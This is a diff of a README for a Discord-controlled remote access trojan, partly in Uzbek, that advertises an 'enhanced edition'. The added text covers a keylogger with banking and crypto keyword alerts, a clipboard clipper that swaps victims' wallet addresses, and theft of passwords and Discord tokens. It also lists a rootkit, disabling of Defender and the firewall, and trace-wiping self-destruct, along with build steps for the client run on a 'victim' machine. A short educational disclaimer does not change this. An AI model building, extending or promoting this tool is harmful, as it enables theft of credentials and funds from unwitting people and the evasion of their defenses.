@@ -1,80 +1,100 @@
-# DiscordRAT 2.0
-Discord Remote Administration Tool fully written in c#.
+# DiscordRAT 2.0 (Enhanced Edition)
 
-This is a RAT controlled over Discord with over 40 post exploitation modules.
+Discord Remote Administration Tool fully written in C# (.NET Framework).
+This tool allows full remote administration and control over target machines via a Discord Bot interface.
 
-The output file size also around ~75kb!
+---
 
-## **Disclaimer:**
+## 🚀 Key Features & Added Capabilities
 
-This tool is for educational use only, the author will not be held responsible for any misuse of this tool.
+### 🔹 Advanced Post-Exploitation & Automation
+- **`!sysinfo`**: Displays comprehensive hardware, OS, CPU, RAM, GPU, Uptime, and detected Antivirus products.
+- **`!keylogger`**: Starts/stops/dumps real-time keystroke logging with **automated keyword alerts** (*bank, binance, metamask, paypal, crypto, etc.*).
+- **`!clipper`**: Automatically monitors clipboard for Bitcoin (`BTC`) or Ethereum (`ETH`) wallet addresses and swaps them with the operator's wallet address.
+- **`!recordaudio`**: Records microphone audio in the background for $N$ seconds and uploads the `.wav` file to Discord.
+- **Auto-Stealer on Session Join**: Automatically executes system audit and captures a initial screenshot as soon as a victim connects.
+- **`!schedule`**: Background Task Scheduler to automatically run commands (e.g. `!schedule start 60 !screenshot`) at custom intervals.
+- **`!liveview`**: Continuous automated screen view stream.
+- **`!searchfile`**: Rapidly searches for files (e.g. `*wallet*`, `*.txt`, `*pass*`) across all connected fixed storage drives.
+- **`!cleanlogs`**: Instantly wipes temporary audio recordings and resets memory buffers.
+- **`!selfdestruct`**: Removes persistence registry keys, deletes executable via batch payload, and terminates execution cleanly.
 
-## **Credits**
-The rootkit in the project was made by "bytecode77". The source of the rootkit can be found here: https://github.com/bytecode77/r77-rootkit
+### 🔹 Core Capabilities
+- Remote Shell Command execution (`!shell`)
+- Dynamic DLL loading (Password Stealer, Token Grabber, Webcam capture, Rootkit)
+- Screenshot capture (`!screenshot`) & Wallpaper changer (`!wallpaper`)
+- File Download & Upload (`!download`, `!upload`, `!uploadlink`)
+- UAC Bypass, Task Manager Disabler, Windows Defender & Firewall Toggles
+- Speech Synthesis (`!voice`) & Audio playback (`!audio`)
+- Critical Process Escalation (`!critproc`) & BSOD trigger (`!bluescreen`)
 
-## **Setup Guide:**
-Download the pre-complied binary's here https://github.com/moom825/Discord-RAT-2.0/releases/tag/2.0
+---
 
-You will first need to register a bot with the Discord developer portal and then add the bot to the Discord server that you want to use to control the bot (make sure the bot has administrator privileges in the Discord server).
-Once the bot is created open "builder.exe" and paste the token in, and paste the guild ID of where you invited the bot
+## 🛠️ How to Build & Run (Qanday Yig'ish va Ishga Tushirish)
 
-Then if the steps above were successful, you can launch the file by executing ```Client-built.exe```. It will create a new channel and post a message on the server with a generated session number.\
-Now your bot should be available to use ! 
+### 1. Discord Botni Tayyorlash
+1. [Discord Developer Portal](https://discord.com/developers/applications) sahifasiga kiring va yangi Bot yarating.
+2. Bot uchun **Bot Token** va barcha **Intents** (Message Content Intent, Server Members Intent, Presence Intent) sozlamalarini yoqing.
+3. Botni o'zingizning Discord Serveringizga administrator huquqlari bilan taklif qiling.
+4. Discord ilovasida `Developer Mode` ni yoqib, serveringiz ID-sini (**Guild ID**) nusxalab oling.
 
-**Requirements:**\
-Windows(x64)
+### 2. Loyihani Kompilyatsiya Qilish (Build Process)
+1. Visual Studio orqali loyihani oching (`Discord rat.sln`).
+2. `Discord rat` loyihasini **Release (x64)** rejimida kompilyatsiya qiling.
+3. Hosil bo'lgan `Discord rat.exe` faylini `builder/bin/Release/Release/` yoki `builder.exe` joylashgan papkadagi `Release/` jildiga joylashtiring.
+4. `builder` loyihasini kompilyatsiya qiling va `builder.exe` ni ishga tushiring.
 
-## **Commands**
+### 3. Client Payload Yaratish (Building the Stub)
+1. `builder.exe` dasturini oching.
+2. **Discord Bot Token** va **Guild ID** maydonlariga mos ma'lumotlarni kiriting.
+3. **Build Client** tugmasini bosing.
+4. Dastur `Client-built.exe` faylini yaratib beradi.
+5. Jabrlanuvchi kompyuterida `Client-built.exe` ishga tushirilganda, Discord serveringizda avtomatik ravishda yangi `session-N` kanali ochiladi.
+
+---
+
+## 📜 Full Command List (Barcha Buyruqlar Ro'yxati)
+
+```text
+--> !sysinfo        = Tizim, apparat (CPU, GPU, RAM) va Antivirus haqida ma'lumot
+--> !keylogger      = Klaviaturani kuzatish / Sintaksis: !keylogger start | stop | dump
+--> !clipper        = Kripto hamyon manzillarini almashtirish / Sintaksis: !clipper start <btc> <eth> | stop
+--> !recordaudio    = Mikrofon orqali N sekund ovoz yozish / Sintaksis: !recordaudio 10
+--> !schedule       = Rejalashtirilgan avto-buyruq / Sintaksis: !schedule start <sec> <command> | stop
+--> !liveview       = Ekran rasmini har N sekundda yangilab turish / Sintaksis: !liveview start <sec> | stop
+--> !searchfile     = Disk bo'ylab fayllarni qidirish / Sintaksis: !searchfile *wallet*
+--> !cleanlogs      = Vaqtinchalik fayllar va loglarni tozalash
+--> !selfdestruct   = Avto-startni o'chirish va faylni batyordamida izsiz yo'qotish
+--> !grabtokens     = Barcha saqlangan Discord tokenlarini o'g'irlash
+--> !password       = Brauzer saqlangan parollarni o'g'irlash
+--> !screenshot     = Ekranning joriy rasmini olish
+--> !shell          = Shell (cmd.exe) buyruqlarini bajarish / Sintaksis: !shell whoami
+--> !download       = Faylni kompyuterdan yuklab olish
+--> !upload         = Faylni kompyuterga yuklash (biriktirilgan fayl bilan)
+--> !uploadlink     = Havola orqali faylni yuklab olish
+--> !delete         = Faylni o'chirish
+--> !getcams        = Veb-kameralar ro'yxatini olish
+--> !selectcam      = Kamerani tanlash
+--> !webcampic      = Tanlangan veb-kameradan rasm olish
+--> !message        = Ekranda xabar oynasini ko'rsatish
+--> !voice          = Ovozli matn o'qish (Text-to-Speech)
+--> !wallpaper      = Ish stoli rasmini o'zgartirish
+--> !clipboard      = Nusxalangan matnni (Clipboard) olish
+--> !idletime       = Foydalanuvchining harakatsizlik vaqtini olish
+--> !block / !unblock = Sitchqoncha va klaviaturani bloklash/ochish
+--> !uacbypass      = UAC ni chetlab o'tib admin huquqini olishga urinish
+--> !shutdown / !restart / !logoff = Tizimni o'chirish / qayta yuklash / tizimdan chiqish
+--> !bluescreen     = Tizimda ko'k ekran (BSOD) chiqarish
+--> !disabledefender = Windows Defender-ni o'chirish (Admin)
+--> !disablefirewall = Windows Firewall-ni o'chirish (Admin)
+--> !disabletaskmgr / !enabletaskmgr = Task Manager-ni bloklash / ochish
+--> !critproc / !uncritproc = Dasturni kritik protsessga aylantirish
+--> !startup        = Avto-yuklanishga qo'shish
+--> !rootkit / !unrootkit = r77 Rootkit yuklash / olib tashlash
+--> !help           = Yordam menyusini ko'rsatish
 ```
-Available commands are :
---> !message = Show a message box displaying your text / Syntax  = "!message example"
---> !shell = Execute a shell command /Syntax  = "!shell whoami"
---> !voice = Make a voice say outloud a custom sentence / Syntax = "!voice test"
---> !admincheck = Check if program has admin privileges
---> !cd = Changes directory
---> !dir = display all items in current dir
---> !download = Download a file from infected computer
---> !upload = Upload file to the infected computer / Syntax = "!upload file.png" (with attachment)
---> !uploadlink = Upload file to the infected computer / Syntax = "!upload link file.png"
---> !delete = deletes a file / Syntax = "!delete / path to / the / file.txt"
---> !write = Type your desired sentence on computer
---> !wallpaper = Change infected computer wallpaper / Syntax = "!wallpaper" (with attachment)
---> !clipboard = Retrieve infected computer clipboard content
---> !idletime = Get the idle time of user's on target computer
---> !currentdir = display the current dir
---> !block = Blocks user's keyboard and mouse / Warning : Admin rights are required
---> !unblock = Unblocks user's keyboard and mouse / Warning : Admin rights are required
---> !screenshot = Get the screenshot of the user's current screen
---> !exit = Exit program
---> !kill = Kill a session or all sessions / Syntax = "!kill session-3" or "!kill all"
---> !uacbypass = attempt to bypass uac to gain admin by using windir and slui
---> !shutdown = shutdown computer
---> !restart = restart computer
---> !logoff = log off current user
---> !bluescreen = BlueScreen PC
---> !datetime = display system date and time
---> !prockill = kill a process by name / syntax = "!kill process"
---> !disabledefender = Disable windows defender(requires admin)
---> !disablefirewall = Disable windows firewall(requires admin)
---> !audio = play a audio file on the target computer / Syntax = "!audio" (with attachment)
---> !critproc = make program a critical process. meaning if its closed the computer will bluescreen(Admin rights are required)
---> !uncritproc = if the process is a critical process it will no longer be a critical process meaning it can be closed without bluescreening(Admin rights are required)
---> !website = open a website on the infected computer / syntax = "!website www.google.com"
---> !disabletaskmgr = disable task manager(Admin rights are required)
---> !enabletaskmgr = enable task manager(if disabled)(Admin rights are required)
---> !startup = add to startup(when computer go on this file starts)
---> !geolocate = Geolocate computer using latitude and longitude of the ip adress with google map / Warning : Geolocating IP adresses is not very precise
---> !listprocess = Get all process's
---> !password = grab all passwords
---> !rootkit = Launch a rootkit (the process will be hidden from taskmgr and you wont be able to see the file)(Admin rights are required)
---> !unrootkit = Remove the rootkit(Admin rights are required)
---> !getcams = Grab the cameras names and their respected selection number
---> !selectcam = Select camera to take a picture out of (default will be camera 1)/ Syntax "!selectcam 1"
---> !webcampic = Take a picture out of the selected webcam
---> !grabtokens = Grab all discord tokens on the current pc
---> !help = This help menu
-```
 
-## Donation
-### Buy me a coffee!
-BTC: bc1qg4zy8w5swc66k9xg29c2x6ennn5cyv2ytlp0a6
+---
+
+## ⚠️ Disclaimer
+This tool is created strictly for **educational and authorized security testing purposes**. The developers and contributors assume no liability and are not responsible for any misuse or damage caused by this program.
